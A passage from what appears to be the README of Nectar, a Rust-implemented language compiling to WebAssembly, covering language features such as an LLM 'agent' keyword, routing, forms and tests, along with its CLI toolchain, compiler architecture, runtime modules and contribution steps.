// Parallel execution — run multiple tasks and collect results
let results = parallel {
    fetch("https://api.example.com/users"),
    fetch("https://api.example.com/posts"),
    fetch("https://api.example.com/comments"),
};
```

### AI Agents

The `agent` keyword defines a component that wraps LLM interaction with tool calling and streaming.

```nectar
agent ChatBot {
    prompt system = "You are a helpful coding assistant.";

    signal messages: [Message] = [];
    signal input: String = "";
    signal streaming: bool = false;

    // Tools — functions the AI can call
    tool search_docs(query: String) -> String {
        let results = await fetch(format("https://api.example.com/search?q={}", query));
        return results.json().summary;
    }

    tool run_code(language: String, code: String) -> String {
        let result = await fetch("https://api.example.com/execute", {
            method: "POST",
            body: { language: language, code: code },
        });
        return result.json().output;
    }

    fn send(&mut self) {
        let msg = Message { role: "user", content: self.input };
        self.messages.push(msg);
        self.input = "";
        self.streaming = true;
        // Stream response — each token updates the UI reactively
        ai::chat_stream(self.messages, self.tools);
    }

    render {
        <div class="chat">
            <div class="messages">
                {for msg in self.messages {
                    <div class={msg.role}>
                        <div class="content">{msg.content}</div>
                    </div>
                }}
                {if self.streaming {
                    <div class="typing">"..."</div>
                }}
            </div>
            <input value={self.input} on:submit={self.send} />
        </div>
    }
}
```

### Routing & Navigation

```nectar
// Define routes
router AppRouter {
    route "/" => Home,
    route "/about" => About,
    route "/user/:id" => UserProfile,      // parameterized route
    route "/admin/*" => AdminPanel guard { AuthStore::is_logged_in() },  // guarded route
    fallback => NotFound,
}

// Link component for navigation
render {
    <nav>
        <Link to="/">"Home"</Link>
        <Link to="/about">"About"</Link>
        <Link to="/user/42">"Profile"</Link>
    </nav>
}

// Programmatic navigation
fn go_home(&self) {
    navigate("/");
}
```

### Animations & Transitions

```nectar
component AnimatedCard() {
    // CSS transitions on state changes
    transition opacity 300ms ease-in-out;
    transition transform 200ms ease;

    // Trigger animations imperatively
    fn on_enter(&self) {
        animate(self.card_ref, "fadeIn");
    }

    style {
        .card {
            opacity: "1";
            transform: "translateY(0)";
        }
    }

    render {
        <div class="card">
            <p>"Animated content"</p>
        </div>
    }
}
```

### Accessibility

Nectar has first-class support for ARIA attributes, roles, and focus management.

```nectar
component Modal(title: String) {
    render {
        <div role="dialog" aria-label={self.title}>
            <h2>{self.title}</h2>
            <div role="document">
                <p>"Modal content"</p>
            </div>
            <button aria-label="Close" on:click={self.close}>"X"</button>
        </div>
    }
}
```

The runtime provides built-in helpers: `setAriaAttribute`, `setRole`, `manageFocus`, `announceToScreenReader`, `trapFocus`, and `releaseFocusTrap`.

### Form Binding

Two-way data binding with the `bind:` directive keeps signals and form inputs in sync automatically.

```nectar
component LoginForm() {
    let mut email: String = "";
    let mut password: String = "";

    render {
        <form>
            <input type="email" bind:value={email} placeholder="Email" />
            <input type="password" bind:value={password} placeholder="Password" />
            <button on:click={self.handle_submit}>"Sign In"</button>
        </form>
    }
}
```

`bind:value`, `bind:checked`, and other bindings set the initial property from the signal, create an effect to keep the DOM in sync, and add input/change listeners to push user edits back.

### Modules & Imports

```nectar
// Import from standard library
use std::string;

// Import specific items
use std::collections::{HashMap, Vec};

// Import with alias
use crate::components::UserCard as Card;

// Glob import
use crate::utils::*;

// Module declarations
mod auth;           // loads auth.nectar from the same directory
mod components {    // inline module
    pub component Button(label: String) {
        render {
            <button>{self.label}</button>
        }
    }
}
```

### Testing

```nectar
test "addition works" {
    assert_eq(2 + 2, 4);
}

test "todo creation" {
    let todo = Todo { id: 0, text: "Test", done: false };
    assert(!todo.done);
    assert_eq(todo.text, "Test");
}

test "store increment" {
    CounterStore::increment();
    assert_eq(CounterStore::get_count(), 1);
}

test "async fetch" {
    let response = await fetch("https://httpbin.org/get");
    assert_eq(response.status, 200, "Expected 200 OK");
}
```

Run tests with:

```bash
nectar test my_tests.nectar
nectar test my_tests.nectar --filter "todo"
```

---

## Toolchain

All tools are subcommands of the single `nectar` binary.

### `nectar build`

Compile `.nectar` source files to WebAssembly.

```bash
nectar build app.nectar                    # Output app.wat (text format)
nectar build app.nectar --emit-wasm        # Output app.wasm (binary)
nectar build app.nectar -o out.wasm --emit-wasm
nectar build app.nectar --ssr              # Output app.ssr.js (server-side rendering)
nectar build app.nectar --hydrate          # Output app.hydrate.wat (hydration bundle)
nectar build app.nectar -O1                # Basic optimization (const fold + DCE)
nectar build app.nectar -O2                # Full optimization (+ tree shaking + WASM opts)
nectar build app.nectar --emit-tokens      # Debug: print token stream
nectar build app.nectar --emit-ast         # Debug: print AST
nectar build app.nectar --no-check         # Skip borrow checker and type checker
```

| Flag | Description |
|---|---|
| `--output`, `-o` | Output file path (default: `<input>.wat` or `.wasm`) |
| `--emit-wasm` | Emit binary `.wasm` instead of `.wat` text |
| `--emit-tokens` | Print the token stream and exit (debugging) |
| `--emit-ast` | Print the parsed AST and exit (debugging) |
| `--ssr` | Emit a server-side rendering JavaScript module |
| `--hydrate` | Emit a client hydration bundle |
| `--no-check` | Skip borrow checking and type checking |
| `-O`, `--optimize` | Optimization level: `0` (none), `1` (const fold + DCE), `2` (all passes) |
| `--critical-css` | Extract and inline critical CSS for above-the-fold content |
| `--sourcemap` | Generate source maps for debugging |
| `--split-chunks` | Enable code splitting at `chunk` boundaries for lazy loading |

### `nectar test`

Compile and run `test` blocks.

```bash
nectar test tests.nectar
nectar test tests.nectar --filter "auth"
```

| Flag | Description |
|---|---|
| `--filter` | Run only tests whose name contains the given pattern |

### `nectar fmt`

Format Nectar source files.

```bash
nectar fmt app.nectar                 # Format in place
nectar fmt app.nectar --check         # Check formatting (exit 1 if changes needed)
nectar fmt --stdin                 # Read from stdin, write to stdout
```

| Flag | Description |
|---|---|
| `--check` | Check without writing; exits with code 1 if reformatting is needed |
| `--stdin` | Read source from stdin instead of a file |

### `nectar lint`

Run static analysis on Nectar source files.

```bash
nectar lint app.nectar
nectar lint app.nectar --fix          # Auto-fix warnings where possible
```

| Flag | Description |
|---|---|
| `--fix` | Attempt to auto-fix lint warnings |

### `nectar dev`

Start a development server with hot reload. The server watches for file changes, recompiles, and pushes updates to the browser via WebSocket -- preserving signal state across reloads.

```bash
nectar dev                            # Defaults: src=., port=3000, build-dir=./build
nectar dev --src ./src --port 8080
nectar dev --build-dir ./dist
```

| Flag | Description |
|---|---|
| `--src` | Source directory to watch (default: `.`) |
| `--port`, `-p` | Port to serve on (default: `3000`) |
| `--build-dir` | Build output directory (default: `./build`) |
| `--flags` | Enable feature flags for dev builds (e.g. `--flags new_dashboard,beta_ui`) |
| `--tunnel` | Expose dev server via public tunnel URL for mobile testing |

### `nectar init` / `nectar add` / `nectar install`

Package management commands.

```bash
nectar init                           # Create Nectar.toml in current directory
nectar init --name my-project         # Create with a specific project name

nectar add router                     # Add a dependency (latest version)
nectar add router --version "^1.0"    # Add with version constraint
nectar add utils --path ../utils      # Add a local path dependency
nectar add ui --features "dark,icons" # Add with features

nectar install                        # Resolve and download all dependencies
```

### `nectar build --target`

Build for different deployment targets.

```bash
nectar build app.nectar --target pwa          # PWA with manifest + service worker
nectar build app.nectar --target twa          # Android Trusted Web Activity wrapper
nectar build app.nectar --target capacitor    # iOS/Android native wrapper
nectar build app.nectar --target ssg          # Static site generation — pre-render all routes
nectar build app.nectar --target ssr          # Server-side rendering — WASM on edge/server
nectar build app.nectar --target hybrid       # SSG for known routes, SSR for dynamic routes
nectar build app.nectar --emit-csp            # Emit Content-Security-Policy header
```

| Flag | Description |
|---|---|
| `--target pwa` | Generate `manifest.webmanifest`, service worker, app shell HTML |
| `--target twa` | Generate Android TWA wrapper for Google Play Store distribution |
| `--target capacitor` | Generate Capacitor project for iOS App Store / Google Play |
| `--target ssg` | Static site generation -- pre-render all `page` routes to HTML at build time |
| `--target ssr` | Server-side rendering -- WASM renders pages on edge/server per request |
| `--target hybrid` | SSG for known routes, SSR for dynamic routes (combines both strategies) |
| `--emit-csp` | Analyze all resource URLs and emit a tight Content-Security-Policy |

### `nectar export-contracts`

Export contract definitions as JSON Schema, OpenAPI, or Protobuf for backend teams.

```bash
nectar export-contracts app.nectar --format jsonschema   # JSON Schema files
nectar export-contracts app.nectar --format openapi      # OpenAPI components/schemas
nectar export-contracts app.nectar --format protobuf     # Protocol Buffers .proto
```

| Flag | Description |
|---|---|
| `--format` | Output format: `jsonschema` (default), `openapi`, `protobuf` |
| `--output`, `-o` | Output directory (default: stdout) |

### `nectar audit`

Audit third-party embeds for security issues, outdated integrity hashes, and loading performance.

```bash
nectar audit app.nectar                      # Audit all embeds in a file
nectar audit --project .                     # Audit all embeds in the project
```

| Flag | Description |
|---|---|
| `--project` | Scan all `.nectar` files in the given directory |
| `--strict` | Fail on any embed without an `integrity` hash |

### `--lsp`

Start the Language Server Protocol server for editor integration (completion, diagnostics, go-to-definition).

```bash
nectar --lsp
```

---

## Architecture

### Compiler Pipeline

```
                                ┌──────────────┐
                                │  Source Code  │
                                │   (.nectar)      │
                                └──────┬───────┘
                                       │
                                       v
                              ┌────────────────┐
                              │     Lexer      │
                              │  token.rs      │
                              └───────┬────────┘
                                      │ tokens
                                      v
                              ┌────────────────┐
                              │     Parser     │  ← error recovery
                              │  parser.rs     │
                              └───────┬────────┘
                                      │ AST
                            ┌─────────┼──────────┐
                            v         v          v
                     ┌────────┐ ┌──────────┐ ┌────────────────┐
                     │ Borrow │ │  Type    │ │ Exhaustiveness │
                     │ Check  │ │  Check   │ │    Check       │
                     └────┬───┘ └────┬─────┘ └───────┬────────┘
                          │          │               │
                          └──────────┼───────────────┘
                                     v
                           ┌───────────────────┐
                           │    Optimizer       │
                           │  const_fold.rs     │
                           │  dce.rs            │
                           │  tree_shake.rs     │
                           └────────┬──────────┘
                                    │ optimized AST
                          ┌─────────┼──────────┐
                          v         v          v
                   ┌──────────┐ ┌────────┐ ┌────────┐
                   │  Codegen │ │  SSR   │ │  WASM  │
                   │  (.wat)  │ │ (.js)  │ │ binary │
                   └──────────┘ └────────┘ └────────┘
```

### Module Reference

| Module | File | Description |
|---|---|---|
| **Lexer** | `lexer.rs` | Tokenizes Nectar source into a stream of typed tokens |
| **Tokens** | `token.rs` | Token type definitions and span tracking |
| **AST** | `ast.rs` | Abstract syntax tree node definitions for the full grammar |
| **Parser** | `parser.rs` | Recursive descent parser with error recovery |
| **Borrow Checker** | `borrow_checker.rs` | Validates ownership, move semantics, and borrow lifetimes |
| **Type Checker** | `type_checker.rs` | Hindley-Milner type inference with trait bounds |
| **Exhaustiveness** | `exhaustiveness.rs` | Checks that `match` expressions cover all variants |
| **Codegen** | `codegen.rs` | Generates WebAssembly text format (`.wat`) |
| **WASM Binary** | `wasm_binary.rs` | Emits binary `.wasm` from the AST |
| **SSR Codegen** | `ssr.rs` | Generates server-side rendering JavaScript modules |
| **Optimizer** | `optimizer.rs` | Orchestrates optimization passes by level |
| **Const Fold** | `const_fold.rs` | Evaluates constant expressions at compile time |
| **DCE** | `dce.rs` | Dead code elimination |
| **Tree Shake** | `tree_shake.rs` | Removes unused functions, structs, and components |
| **WASM Opt** | `wasm_opt.rs` | Peephole optimizations on generated WAT |
| **Sourcemap** | `sourcemap.rs` | Source map generation for debugging |
| **Formatter** | `formatter.rs` | Code formatter for `nectar fmt` |
| **Linter** | `linter.rs` | Static analysis rules for `nectar lint` |
| **LSP** | `lsp.rs` | Language Server Protocol implementation |
| **Dev Server** | `devserver.rs` | Development server with file watching and hot reload |
| **Module Resolver** | `module_resolver.rs` | Resolves `mod` and `use` paths to files |
| **Module Loader** | `module_loader.rs` | Loads and merges multi-file projects |
| **Package** | `package.rs` | `Nectar.toml` manifest parsing and lockfile management |
| **Registry** | `registry.rs` | Package registry client for dependency downloads |
| **Resolver** | `resolver.rs` | Dependency version resolution |
| **Stdlib** | `stdlib.rs` | Built-in standard library definitions |

---

## Runtime

Nectar compiles to WebAssembly, which cannot directly access the DOM or browser APIs. The **runtime bridge** (`runtime/`) is a set of lightweight JavaScript modules that provide the host functions WASM imports at instantiation.

The runtime is intentionally minimal -- there is no virtual DOM, no diffing algorithm, and no framework overhead. Nectar uses fine-grained reactivity (signals) to surgically update only the DOM nodes that depend on changed state.

| Runtime Module | Purpose |
|---|---|
| `nectar-runtime.js` | Core DOM bridge (`createElement`, `setText`, `appendChild`, `setAttribute`, `addEventListener`), signal/effect reactivity engine, HTTP fetch bridge, Web Worker concurrency, AI/LLM interaction, WebSocket/SSE streaming, router, accessibility helpers, and Web API bindings (localStorage, clipboard, timers, IntersectionObserver, etc.) |
| `nectar-ssr-runtime.js` | Node.js server-side rendering -- provides a mock DOM that collects HTML strings instead of creating real nodes. Exports `renderToString()` and `renderToStream()`. |
| `nectar-hydration.js` | Attaches interactivity to server-rendered HTML. Walks existing DOM nodes, matches hydration markers, and binds signals and event handlers without recreating the tree. |
| `nectar-hot-reload.js` | Development-mode hot module replacement. Connects to the dev server via WebSocket, swaps WASM modules on file change, and preserves signal state across reloads. |
| `nectar-test-runner.js` | Executes compiled test WASM modules in Node.js and reports pass/fail results. |
| `nectar-test-renderer.js` | Virtual DOM test renderer for component testing -- mount components, query by text/role/attribute, simulate clicks and input. |

---

## Examples

The `examples/` directory contains complete programs demonstrating Nectar's features.

| File | Description |
|---|---|
| [`hello.nectar`](examples/hello.nectar) | Hello World -- components, props, render templates |
| [`counter.nectar`](examples/counter.nectar) | Interactive counter -- state, signals, event handlers, ownership |
| [`todo.nectar`](examples/todo.nectar) | Todo app -- structs, enums, ownership, collections, pattern matching |
| [`store.nectar`](examples/store.nectar) | Global stores -- signals, actions, computed values, effects, async actions |
| [`app.nectar`](examples/app.nectar) | Full application -- routing, scoped styles, route guards, `<Link>` navigation |
| [`api.nectar`](examples/api.nectar) | API communication -- fetch, async/await, GET/POST/DELETE, error handling |
| [`ai-chat.nectar`](examples/ai-chat.nectar) | AI chat interface -- `agent` keyword, tool definitions, streaming responses |
| [`contracts.nectar`](examples/contracts.nectar) | API boundary contracts -- compile-time field checking, runtime validation, content hashing |
| [`security.nectar`](examples/security.nectar) | Security features -- `secret` types, `permissions` blocks, capability enforcement |
| [`pwa-app.nectar`](examples/pwa-app.nectar) | Progressive Web App -- `app` manifest, offline caching, gestures, hardware access |
| [`seo.nectar`](examples/seo.nectar) | SEO & AAIO -- `page` keyword, `meta` blocks, structured data, auto sitemap, semantic HTML |
| [`forms.nectar`](examples/forms.nectar) | Declarative forms -- `form` keyword, field validation, multi-step |
| [`realtime.nectar`](examples/realtime.nectar) | Real-time -- `channel` keyword, WebSocket, typed messages |
| [`concurrency.nectar`](examples/concurrency.nectar) | Concurrency -- `spawn`, `parallel`, off-main-thread computation |
| [`error-handling.nectar`](examples/error-handling.nectar) | Error handling -- `must_use`, exhaustive Result/Option matching |
| [`embeds.nectar`](examples/embeds.nectar) | Third-party embeds -- `embed` keyword, sandbox isolation, loading strategies, SRI |
| [`time.nectar`](examples/time.nectar) | Time & timezones -- `Instant`, `ZonedDateTime`, `Duration`, DST-safe arithmetic |
| [`pdf.nectar`](examples/pdf.nectar) | PDF generation -- `pdf` keyword, `download()` builtin, render-to-PDF |
| [`payments.nectar`](examples/payments.nectar) | Payments -- `payment` keyword, PCI-compliant sandbox, Stripe integration |
| [`auth.nectar`](examples/auth.nectar) | Authentication -- `auth` keyword, OAuth providers, session management |
| [`uploads.nectar`](examples/uploads.nectar) | File uploads -- `upload` keyword, progress tracking, chunked/resumable |
| [`database.nectar`](examples/database.nectar) | Local database -- `db` keyword, IndexedDB abstraction, declarative schema |
| [`observability.nectar`](examples/observability.nectar) | Observability -- `trace` blocks, `flag()` feature flags, performance metrics |
| [`cache.nectar`](examples/cache.nectar) | Data caching — `cache` keyword, queries, mutations, SWR, optimistic updates |

Compile any example:

```bash
nectar build examples/counter.nectar --emit-wasm
nectar build examples/app.nectar --ssr
nectar build examples/todo.nectar -O2 --emit-wasm
```

---

## Contributing

### Building from source

```bash
git clone https://github.com/BlakeBurnette/nectar-lang.git
cd nectar-lang
cargo build
```

### Running the test suite

```bash
cargo test
```

### Project structure

```
nectar-lang/
  compiler/
    src/
      main.rs          # CLI entry point
      lexer.rs         # Tokenizer
      parser.rs        # Parser
      ast.rs           # AST definitions
      codegen.rs       # WASM code generation
      ...              # (see Architecture section)
  runtime/
    nectar-runtime.js     # Browser runtime bridge
    nectar-ssr-runtime.js # SSR runtime
    nectar-hydration.js   # Hydration runtime
    nectar-hot-reload.js  # HMR client
    nectar-test-runner.js # Test execution
    nectar-test-renderer.js # Component test renderer
  examples/
    hello.nectar
    counter.nectar
    todo.nectar
    store.nectar
    app.nectar
    api.nectar
    ai-chat.nectar
    seo.nectar
    contracts.nectar
    security.nectar
    pwa-app.nectar
    forms.nectar
    realtime.nectar
    concurrency.nectar
    error-handling.nectar
    component-tests.nectar
    agent-tests.nectar
    embeds.nectar
    time.nectar
    pdf.nectar
    payments.nectar
    auth.nectar
    uploads.nectar
    database.nectar
    observability.nectar
    cache.nectar
```

### How to contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/my-feature`)
3. Make your changes
4. Run `cargo test` and `cargo clippy` to verify
5. Submit a pull request

Bug reports, feature requests, and documentation improvements are all welcome. Please open an issue before starting significant work to discuss the approach.

---

## License

MIT License. See [LICENSE](LICENSE) for details.
